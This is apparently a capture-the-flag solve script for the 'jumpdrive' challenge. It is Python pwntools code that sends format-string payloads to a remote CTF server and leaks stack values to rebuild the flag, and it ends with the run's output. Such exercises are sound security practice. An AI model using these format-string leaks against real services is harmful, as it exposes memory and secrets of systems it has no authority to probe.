from pwn import *
import codecs

def f(idx):
    p = remote('pwn.ctf.b01lers.com', 1002)
    buf = f'%{idx}$016p\n'.encode('utf-8')
    p.recvuntil(b'going?\n')
    p.send(buf)
    data = p.recv(1024).strip(b'\n')[2:]
    data = codecs.decode(data, 'hex')[::-1]
    return data

def main():
    idx = 10
    flag = b''
    while True:
        buf = f(idx)
        flag += buf
        if b'}' in buf:
            break
        idx += 1
    print(flag)

main()

'''
(ctf-py) [jai@roci jumpdrive]$ python solve.py 
[+] Opening connection to pwn.ctf.b01lers.com on port 1002: Done
[+] Opening connection to pwn.ctf.b01lers.com on port 1002: Done
[+] Opening connection to pwn.ctf.b01lers.com on port 1002: Done
[+] Opening connection to pwn.ctf.b01lers.com on port 1002: Done
b'pctf{pr1nTf_1z_4_St4R_m4p}\n\x00\xe0\x7f\x00'
'''
